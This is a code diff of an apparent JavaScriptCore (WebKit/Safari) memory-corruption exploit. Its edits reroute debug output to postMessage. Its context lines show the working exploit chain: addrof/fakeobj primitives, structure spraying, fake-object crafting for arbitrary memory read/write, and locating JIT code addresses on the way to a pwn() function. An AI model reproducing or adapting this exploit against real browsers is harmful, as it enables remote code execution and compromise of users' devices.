@@ -517,14 +517,14 @@ var VM_PROT_EXECUTE = 0x4
               return new Int64.fromDouble(a1[0]);
             }
             port.postMessage("obj addr@ " + addrof({}))
-            var rw = {
+            /*var rw = {
                 fake: function(addr) {
                     fakeobj(addr)
                 },
                 addr: function(obj) {
                     addrof(obj)
                 },
-            };
+            };*/
             port.postMessage("We got stableish addrof and fakeobj");
             // from saelo: spray structures to be able to predict their IDs.
     // from Auxy: I am not sure about why spraying. i change the code to:
@@ -557,7 +557,7 @@ var VM_PROT_EXECUTE = 0x4
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     
-    print("[+] victim @"+addrof(victim));
+    port.postMessage("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
@@ -568,7 +568,7 @@ var VM_PROT_EXECUTE = 0x4
 
     // create object having |victim| as butterfly.
     var containerAddr = addrof(container);
-    print("[+] container @"+ containerAddr);
+    port.postMessage("[+] container @"+ containerAddr);
     // add the offset to let compiler recognize fake structure
     var hax = fakeobj(containerAddr + new Int64(0x10));
     /*var maxtry = 0;
@@ -657,7 +657,7 @@ var VM_PROT_EXECUTE = 0x4
     //memory.test();
     //let memory.read_i64 = memory.read64;
      
-    print("[+] arbitrary memory read/write working");
+    port.postMessage("[+] arbitrary memory read/write working");
         var log = print;
         
         function makeJITCompiledFunction() {
@@ -746,14 +746,14 @@ var VM_PROT_EXECUTE = 0x4
     return target;
   }
     var funcAddr = memory.addrof(makeJITCompiledFunction());
-    print("[+] JIT function @ " + funcAddr.toString());
+    port.postMessage("[+] JIT function @ " + funcAddr.toString());
     var executableAddr = memory.read64(Add(funcAddr, 3 * 8));
-    print("[+] Executable instance @ " + executableAddr.toString());
+    port.postMessage("[+] Executable instance @ " + executableAddr.toString());
 
     var jitCodeAddr = memory.read64(Add(executableAddr, 3 * 8));
-    print("[+] JITCode instance @ " + jitCodeAddr.toString());
+    port.postMessage("[+] JITCode instance @ " + jitCodeAddr.toString());
     var anchor = memory.read64(jitCodeAddr);
-    print("JavaScriptCore instance @" + anchor);
+    port.postMessage("JavaScriptCore instance @" + anchor);
           }
           function pwn() {
             try {
